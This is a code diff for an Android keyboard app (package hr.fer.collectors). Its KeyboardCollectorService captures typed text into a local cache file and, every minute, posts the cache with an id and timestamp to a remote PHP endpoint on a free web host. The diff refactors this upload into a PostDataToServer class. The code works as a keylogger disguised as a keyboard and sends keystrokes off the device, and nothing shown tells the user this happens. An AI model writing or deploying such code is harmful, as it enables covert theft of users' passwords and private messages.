@@ -1,38 +1,24 @@
 package hr.fer.collectors;
 
-
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
 import android.inputmethodservice.InputMethodService;
-import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
-import android.os.AsyncTask;
 import android.os.Handler;
-import android.os.IBinder;
-import android.os.UserHandle;
-import android.support.annotation.Nullable;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
-import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Timer;
 import java.util.TimerTask;
 
-import hr.fer.connection.HTTPURLConnection;
+import hr.fer.connection.PostDataToServer;
 import hr.fer.keyboard.R;
 
 public class KeyboardCollectorService extends  InputMethodService
@@ -40,7 +26,6 @@ public class KeyboardCollectorService extends  InputMethodService
     public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
     private final String PATH = "./cache.txt";
     private final String SERVER_PATH = "https://zavradmb2018.000webhostapp.com/addText.php";
-    private HTTPURLConnection service;
     private File cache;
 
     private KeyboardView kv;
@@ -68,9 +53,8 @@ public class KeyboardCollectorService extends  InputMethodService
     public void onCreate() {
         super.onCreate();
 
-
         File path = getApplicationContext().getFilesDir();
-        cache = new File(path, "cache.txt");
+        cache = new File(path, PATH);
 
         try {
             cache.createNewFile();
@@ -79,7 +63,6 @@ public class KeyboardCollectorService extends  InputMethodService
         }
 
         typedText = new StringBuilder();
-        service = new HTTPURLConnection();
 
         if (timer != null) {
             timer.cancel();
@@ -190,24 +173,45 @@ public class KeyboardCollectorService extends  InputMethodService
         return contents;
     }
 
+    private HashMap<String, String> preparePOSTParams(){
+        String contents = "";
+        try {
+            contents = readFromCache();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        if(contents.length() == 0) return null;
+
+        HashMap<String, String> postDataParams = new HashMap<>();
+        postDataParams.put("id", String.valueOf(++id));
+        postDataParams.put("text", contents);
+        postDataParams.put("datetime", datetime.toString());
+        return postDataParams;
+    }
+
     private class CacheTimer extends TimerTask{
 
         @Override
         public void run() {
-
             //did I type something new?
             handler.post(new Runnable() {
                 @Override
                 public void run() {
                     Log.d("CacheTimer", "Sending to server...");
                     //send cached text to server
-                    new PostDataTOServer().execute();
+                    HashMap<String, String> params = preparePOSTParams();
+                    if(params == null) return;
+                    new PostDataToServer(SERVER_PATH, preparePOSTParams()).execute();
                 }
 
             });
         }
     }
 
+
+
+    /*
     private class PostDataTOServer extends AsyncTask<Void, Void, Void> {
         private String contents = ";";
 
@@ -238,12 +242,9 @@ public class KeyboardCollectorService extends  InputMethodService
         }
 
 
-
-
-
     }
 
-
+*/
 
 
 }
